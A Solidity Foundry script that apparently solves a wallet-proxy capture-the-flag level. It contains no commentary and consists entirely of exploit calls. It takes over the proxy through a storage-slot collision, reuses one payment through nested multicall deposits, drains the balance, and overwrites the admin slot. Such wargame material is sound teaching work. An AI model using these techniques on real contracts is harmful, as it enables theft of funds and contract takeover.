// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Level24Script is Script {
    address proxy=0xE005F019B047e2c3A69f8767bf68646B2B313821;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
       uint256 owner256=uint256(uint160(bytes20(msg.sender)));
        (bool a,) = address(proxy).call(abi.encodeWithSignature("proposeNewAdmin(address)",msg.sender));
         require(a);
        (bool b,) = address(proxy).call(abi.encodeWithSignature("addToWhitelist(address)",msg.sender));
         require(b);
          bytes[] memory deposit=new bytes[](1);
         deposit[0]=abi.encodeWithSignature("deposit()");
         bytes memory data=abi.encodeWithSignature("multicall(bytes[])", deposit);
         bytes memory withdraw=abi.encodeWithSignature("execute(address,uint256,bytes)", msg.sender,0.002 ether,"");
         bytes[] memory calls=new bytes[](3);
         calls[0]=data;
         calls[1]=data;
         calls[2]=withdraw;
         (bool c,) = address(proxy).call{value:0.001 ether}(abi.encodeWithSignature("multicall(bytes[])",calls));
         require(c);
         (bool d,) = address(proxy).call(abi.encodeWithSignature("setMaxBalance(uint256)",owner256));
         require(d);
        vm.stopBroadcast();
    }
}




